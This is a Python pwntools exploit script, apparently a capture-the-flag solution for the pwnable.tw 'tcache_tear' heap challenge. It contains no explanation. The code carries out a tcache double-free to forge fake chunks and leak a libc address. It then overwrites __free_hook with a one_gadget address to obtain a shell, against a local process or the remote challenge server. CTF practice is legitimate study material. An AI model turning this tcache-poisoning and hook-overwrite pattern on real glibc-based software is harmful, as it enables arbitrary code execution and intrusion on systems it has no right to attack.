#!/usr/bin/python2
"""
tcachce_perthread = leak - 0x260
"""
from pwn import *

p = process(['./ld-2.27.so', './tcache_tear'], env = {'LD_PRELOAD':'/home/jack_0f_spades/Documents/pwnable.tw/tcache_tear/libc-2.27.so'}) if '-r' not in sys.argv else remote('chall.pwnable.tw',10207)
e = ELF('./tcache_tear')
libc = ELF('./libc-2.27.so')

context.binary = e

name_buf = 0x0602060 + 0x10
forged_chunk = 0x602470 + 0xf0


p.sendafter('Name:', p64(0) + p64(0x501))

def create(size, data):
    p.sendlineafter('Your choice :', '1')
    p.sendlineafter('Size:', str(size))
    p.sendafter('Data:', data)

def delete():
    p.sendlineafter('Your choice :', '2')

def info():
    p.sendlineafter('Your choice :', '3')
    p.recvuntil('Name :')
    p.recv(16)
    data = p.recvuntil('\x00')
    return data


##FORGING FAKE CHUNK
create(0x40, "AAAAAAA")
delete()
delete()
create(0x40, p64(forged_chunk) + p64(forged_chunk))
create(0x40, "CCCCCCC")
create(0x40, p64(0x0) + p64(0x21) + "A"*32 + p64(0x0) + p64(0x21))

##FAKE CHUNK AT NUME BUF
create(40, "AAAAA")
delete()
delete()
create(40, p64(name_buf) + p64(name_buf))
create(40, "CCCCCCCCCC")
create(40, "D"*16)

delete()

##GET LEAK
libc_leak = info()
libc_base = u64(libc_leak + '\x00'*(8-len(libc_leak))) - 0x3ebca0
log.info('LIBC_BASE: {}'.format(hex(libc_base)))
free_hook = libc_base+libc.symbols['__free_hook']
one_gadget = libc_base + 0x4f322
log.info('ONE_GADGET: {}'.format(hex(one_gadget)))

##OVERWRITE MALLOC_HOOK
create(0x50, "AAAAA")
delete()
delete()
create(0x50, p64(free_hook) + p64(free_hook))
create(0x50, "CCCCCCCCCC")
create(0x50, p64(one_gadget))

#gdb.attach(p)

p.interactive()
